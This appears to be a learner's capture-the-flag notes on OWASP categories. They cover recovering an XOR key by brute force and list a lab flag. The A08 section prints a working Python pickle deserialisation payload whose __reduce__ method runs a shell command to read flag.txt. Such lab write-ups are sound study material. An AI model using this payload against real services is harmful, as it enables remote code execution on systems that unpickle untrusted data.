
## A04: Cryptographic Failures

We have this encryption with the password "KEY_": 

For example:
`GAAaYw4RYxEfDRRKHAAYehQGC2gbERZuDQkYdjZldBEPKnlfJDF5QiMkK1RrMTFYOGUuWD8teUQlJCxFIyorWDEgPRE7ICtCJCs3VCdr 
-> 
sec_et-thmvweaFcrTptoRflaJ] -dOcOT~HARhTHdSWdTHxNAUyHORdZED-PER~ONNhL`

The encrption is P ⊕ K = C
So to decrypt is necessary to C ⊕ K = P 

In this case "R" ⊕ K = "A"


"Q" ⊕ K = "S"

After bruteforce it was "KEY1" -> THM{WEAK_CRYPTO_FLAG}



## A05: Injection



## A08: Software or Data Integrity Failures
Insecure deserialisation:

```python
import pickle, base64, subprocess

  

class RCE:

    def __reduce__(self):

        return (subprocess.check_output, (['cat', 'flag.txt'],))

  

payload = pickle.dumps(RCE())

print(base64.b64encode(payload).decode())
```
